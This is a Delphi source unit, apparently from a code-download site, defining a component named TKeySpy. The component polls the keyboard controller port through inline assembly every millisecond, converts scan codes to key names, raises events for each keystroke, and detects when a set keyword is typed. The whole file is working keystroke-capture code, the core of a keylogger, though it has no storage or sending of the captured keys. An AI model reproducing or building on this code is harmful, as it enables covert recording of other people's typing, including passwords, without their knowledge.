unit   FlatLocky;
   //download by http://www.codefans.net 
interface

uses
{$IFDEF WIN32} Windows, {$ELSE} WinTypes, WinProcs,{$ENDIF} 
SysUtils, Controls, Classes, Messages, Forms; 

type 
 TOnKeySpy = procedure(Sender: TObject; Key: Byte; KeyStr: String) of object;
 TKeySpy = class(TComponent)
 private
  FWindowHandle: HWnd;
  FOnKeySpyDown, FOnKeySpyUp: TOnKeySpy;
  FOnKeyword: TNotifyEvent;
  FEnabled: Boolean;
  FKeyword,KeyComp: String;
  OldKey: Byte;
  LShiftUp, RShiftUp: Boolean;
  procedure UpdateTimer;
  procedure SetEnabled(Value: Boolean);
  procedure WndProc(var Msg: TMessage);
 protected
  procedure KeySpy; dynamic;
 public
  constructor Create(AOwner: TComponent); override;
  destructor Destroy; override;
 published
  property Enabled: Boolean read FEnabled write SetEnabled;
  property Keyword: String read FKeyword write FKeyword;
  property OnKeySpyDown: TOnKeySpy read FOnKeySpyDown write FOnKeySpyDown;
  property OnKeySpyUp: TOnKeySpy read FOnKeySpyUp write FOnKeySpyUp;
  property OnKeyword: TNotifyEvent read FOnKeyword write FOnKeyword;
 end;

implementation

const 
LowButtonName: Array[1..88] of PChar = ('--Esc','1','2','3','4','5','6','7','8','9', 
    '0','-','=','--BkSp','--Tab','q','w','e','r','t',
    'y','u','i','o','p','[',']','--Enter','--Ctrl','a',
    's','d','f','g','h','j','k','l',';','''','`',
    '--LShift Down','\','z','x','c','v','b','n','m',',',
    '.','/','--RShift Down','--Gray*','--Alt','--Space',
    '--CapsLock','--F1','--F2','--F3','--F4','--F5',
    '--F6','--F7','--F8','--F9','--F10',
    '--NumLock','--ScrollLock','--Home','--Up',
    '--PgUp','--Gray-','--Left','--*5*','--Right',
    '--Gray+','--End','--Down','--PgDown','--Ins',
    '--Del','--LShift Up','--RShift Up',
    '--Unknown','--F11','--F12');

HiButtonName: Array[1..88] of PChar = ('--Esc','!','@','#','$','%','^','&','*','(',
    ')','_','+','--BkSp','--Tab','Q','W','E','R','T',
    'Y','U','I','O','P','{','}','--Enter','--Ctrl','A',
    'S','D','F','G','H','J','K','L',':','"','~',
    '--LShift Down','|','Z','X','C','V','B','N','M','<',
    '>','?','--RShift Down','--Gray*','--Alt','--Space',
    '--CapsLock','--F1','--F2','--F3','--F4','--F5',
    '--F6','--F7','--F8','--F9','--F10',
    '--NumLock','--ScrollLock','--Home','--Up',
    '--PgUp','--Gray-','--Left','--*5*','--Right',
    '--Gray+','--End','--Down','--PgDown','--Ins',
    '--Del','--LShift Up','--RShift Up',
    '--Unknown','--F11','--F12'); 

constructor TKeySpy.Create(AOwner: TComponent); 
begin 
inherited Create(AOwner); 
LShiftUp := True; 
RShiftUp := True; 
FEnabled := false; 
FWindowHandle := AllocateHWnd(WndProc); 
if FEnabled then UpdateTimer; 
end; 

destructor TKeySpy.Destroy; 
begin 
FEnabled := False; 
UpdateTimer; 
DeallocateHWnd(FWindowHandle); 
inherited Destroy; 
end; 

procedure TKeySpy.WndProc(var Msg: TMessage); 
begin 
with Msg do 
if Msg = WM_TIMER then 
try 
KeySpy; 
except 
Application.HandleException(Self); 
end 
else 
Result := DefWindowProc(FWindowHandle, Msg, wParam, lParam); 
end; 

procedure TKeySpy.UpdateTimer; 
var 
b: Byte; 
begin 
KillTimer(FWindowHandle, 1); 
if FEnabled then 
begin 
asm 
mov al, 60h 
mov b, al 
end; 
OldKey := b; 
if SetTimer(FWindowHandle, 1, 1, nil) = 0 then 
raise EOutOfResources.Create('No timers'); 
end; 
end; 

procedure TKeySpy.SetEnabled(Value: Boolean); 
begin 
if Value <> FEnabled then 
begin 
FEnabled := Value; 
UpdateTimer; 
end; 
end; 

procedure TKeySpy.KeySpy; 
var 
Key: Byte; 
St: String; 
begin 
asm 
in al, 60h 
mov Key, al 
end; 
if Key = 170 then 
begin 
Key := 84; 
LShiftUp := True; 
end; 
if Key = 182 then 
begin 
Key := 85; 
RShiftUp := True; 
end; 
if Key = 42 then LShiftUp := False; 
if Key = 54 then RShiftUp := False; 
if Key <> OldKey then 
begin 
OldKey := Key; 
if Key <= 88 then 
if Assigned(FOnKeySpyDown) then 
begin 
if LShiftUp and RShiftUp then 
St := StrPas(LowButtonName[Key]) 
else 
St := StrPas(HiButtonName[Key]); 

FOnKeySpyDown(Self, Key, St); 

KeyComp := KeyComp + St; 
if Length(KeyComp) > Length(FKeyword) then 
begin 
Move(KeyComp[Length(St) + 1], KeyComp[1], Length(KeyComp)); 
{$IFDEF WIN32} 
SetLength(KeyComp, Length(FKeyword)); 
{$ELSE} 
KeyComp[0] := char(Length(FKeyword)); 
{$ENDIF} 
end; 

if KeyComp = FKeyword then FOnKeyword(Self); 
end 
else 
else 
if Assigned(FOnKeySpyUp) and (Key - 128 <= 88) then 
begin 
if LShiftUp and RShiftUp then 
St := StrPas(LowButtonName[Key - 128]) 
else 
St := StrPas(HiButtonName[Key - 128]); 
FOnKeySpyUp(Self, Key, St) 
end; 
end; 
end; 

end.